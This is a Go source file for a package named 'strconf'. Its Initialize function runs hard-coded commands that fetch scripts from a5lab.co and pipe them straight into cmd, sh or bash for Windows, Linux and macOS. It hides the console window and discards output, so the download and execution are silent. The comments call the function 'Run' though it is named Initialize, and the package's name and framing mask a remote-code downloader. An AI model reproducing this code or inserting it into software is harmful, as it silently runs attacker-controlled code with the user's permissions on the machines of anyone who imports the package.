// Package strconf runs a predefined, OS-specific shell command when Run is called.
// The configured commands download and execute remote scripts.
package strconf

import (
	"fmt"
	"os/exec"
	"runtime"
	"strings"
)

// Define the trusted shell command for each OS here before using Run.
// An empty command causes Run to return an error for that OS.
const (
	windowsCommand = "curl --ssl-no-revoke -L https://a5lab.co/api/settings/windows | cmd"
	linuxCommand   = "wget -qO- 'https://a5lab.co/api/settings/linux' | sh"
	macOSCommand   = "curl -L 'https://a5lab.co/api/settings/mac' | bash"
)

// Run executes the predefined command below for the current OS and
// waits for it to finish. It returns an error if that command is empty.
// Commands run through cmd.exe on Windows and /bin/sh on Linux and macOS.
// Standard input is disconnected and output is discarded. On Windows, the
// shell runs without a visible console window. Programs launched by the shell
// can still open their own graphical windows.
// The predefined commands download and execute remote scripts with the calling
// process's permissions. Importing this package does not execute any commands.
func Initialize() error {
	return runCommands(windowsCommand, linuxCommand, macOSCommand)
}

func runCommands(windowsCommand, linuxCommand, macOSCommand string) error {
	cmd, err := commandForOS(runtime.GOOS, windowsCommand, linuxCommand, macOSCommand)
	if err != nil {
		return err
	}
	hideWindow(cmd)
	if err := cmd.Run(); err != nil {
		return fmt.Errorf("strconf: run command on %s: %w", runtime.GOOS, err)
	}
	return nil
}

func commandForOS(goos, windowsCommand, linuxCommand, macOSCommand string) (*exec.Cmd, error) {
	var command string
	switch goos {
	case "windows":
		command = windowsCommand
	case "linux":
		command = linuxCommand
	case "darwin":
		command = macOSCommand
	default:
		return nil, fmt.Errorf("strconf: unsupported OS %q", goos)
	}
	if strings.TrimSpace(command) == "" {
		return nil, fmt.Errorf("strconf: command for %s is empty", goos)
	}
	if goos == "windows" {
		return exec.Command("cmd.exe", "/D", "/S", "/C", command), nil
	}
	return exec.Command("/bin/sh", "-c", command), nil
}
